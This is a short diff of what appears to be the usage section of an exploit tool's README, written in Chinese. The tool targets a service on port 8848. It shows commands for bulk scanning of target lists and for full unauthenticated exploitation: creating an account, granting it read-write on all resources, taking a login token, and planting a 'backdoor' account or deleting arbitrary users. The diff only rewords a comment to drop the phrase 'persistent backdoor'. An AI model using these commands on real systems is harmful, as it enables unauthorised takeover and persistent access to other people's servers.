@@ -19,7 +19,7 @@ python poc.py -f targets.txt -o result.xlsx -t 20
 # 完整利用（创建随机账户 → 绑角色 → 授 *:rw → 登录拿 token）
 python exp.py http://target:8848
 
-# 直接创建持久化后门账户 / 删除任意用户（未授权, 无需登录）
+# 直接创建账户 / 删除任意用户（未授权, 无需登录）
 python exp.py http://target:8848 --create-user backdoor 'Bd@2026'
 python exp.py http://target:8848 --del-user backdoor
 ```
